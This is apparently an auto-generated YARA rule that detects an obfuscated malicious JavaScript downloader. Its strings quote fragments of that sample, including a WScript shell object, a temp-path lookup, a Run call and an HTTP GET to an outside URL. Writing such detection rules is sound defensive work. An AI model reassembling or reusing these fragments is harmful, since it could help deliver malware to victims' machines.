rule sig_20160428_616beac1e517be7bada58ebfa28909b1 {
  meta:
    description = "datamaliciousorder - file 20160428_616beac1e517be7bada58ebfa28909b1.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "3bd3baaf7cedf1c837dc5e3618096e660ed743c14c4f521be76042fa3022d62d"

  strings:
    $s1  = "JdyJmaZkjRrjSwkYjdWwv[SgnDpaAvhPhgOuhClqJtk](\"G\" + \"ET\", \"http://laichaupc.com/m8eusk\", false);" fullword ascii
    $s2  = "function QshGppOwqGuwVdsLikYmw() {return CokZlrUrdWmsMsdLacUry[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s3  = "var CokZlrUrdWmsMsdLacUry = function TchArbNouAebBrtUltWww() {return UcpKvmEcvAtiCznFnjXap[HgoCrdNuhVbyTyqSeyYol](\"WScript\"+\"" ascii
    $s4  = "function NzfXqoQyeChcKcsWskTip(LppDgaYwgUuwOfuZciQaq){CokZlrUrdWmsMsdLacUry[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s5  = "function NzfXqoQyeChcKcsWskTip(LppDgaYwgUuwOfuZciQaq){CokZlrUrdWmsMsdLacUry[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s6  = "var CokZlrUrdWmsMsdLacUry = function TchArbNouAebBrtUltWww() {return UcpKvmEcvAtiCznFnjXap[HgoCrdNuhVbyTyqSeyYol](\"WScript\"+\"" ascii
    $s7  = "function RqjZoqQeoZqdGtuBxpKto(LsaAdyVstKvkSxcBbfHmg, JvcHmoUrpQijJstHxyLjl){IocCmoXyeNosAtnNlbWfo = IocCmoXyeNosAtnNlbWfo * 1; " ascii
    $s8  = "return LsaAdyVstKvkSxcBbfHmg - JvcHmoUrpQijJstHxyLjl;};" fullword ascii
    $s9  = "function QshGppOwqGuwVdsLikYmw() {return CokZlrUrdWmsMsdLacUry[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s10 = "var UcpKvmEcvAtiCznFnjXap = this[\"WScript\"];" fullword ascii
    $s11 = "function RqjZoqQeoZqdGtuBxpKto(LsaAdyVstKvkSxcBbfHmg, JvcHmoUrpQijJstHxyLjl){IocCmoXyeNosAtnNlbWfo = IocCmoXyeNosAtnNlbWfo * 1; " ascii
    $s12 = "if (JdyJmaZkjRrjSwkYjdWwv[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s13 = "function KktFyeSwlLngOniJejEhi(){return AhiZghFfoVthUarJmdFtn + \"\";};" fullword ascii
    $s14 = "function KleYstEuuBfjYuoXesUbw() {return ((IznNzbSfzZhaGlsMtwMje == true) && (IznNzbSfzZhaGlsMtwMje == HdaIxgZzjRleXkuYmjCiy)) ?" ascii
    $s15 = "function KleYstEuuBfjYuoXesUbw() {return ((IznNzbSfzZhaGlsMtwMje == true) && (IznNzbSfzZhaGlsMtwMje == HdaIxgZzjRleXkuYmjCiy)) ?" ascii
    $s16 = "var CoxOtoUkpZadEfoUgxQqi = false;" fullword ascii
    $s17 = "var HdaIxgZzjRleXkuYmjCiy = false;" fullword ascii
    $s18 = "function AgqCjrKfiGqqNxfOldLxa()" fullword ascii
    $s19 = "function ClbAflZskJduAhkMxrGyh(JejHybWsuGfxEsnJigEvx) {var BseJgvUooFhgXkeHicUkx = (1, 2, 3, 4, 5, JejHybWsuGfxEsnJigEvx); retur" ascii
    $s20 = "function ClbAflZskJduAhkMxrGyh(JejHybWsuGfxEsnJigEvx) {var BseJgvUooFhgXkeHicUkx = (1, 2, 3, 4, 5, JejHybWsuGfxEsnJigEvx); retur" ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}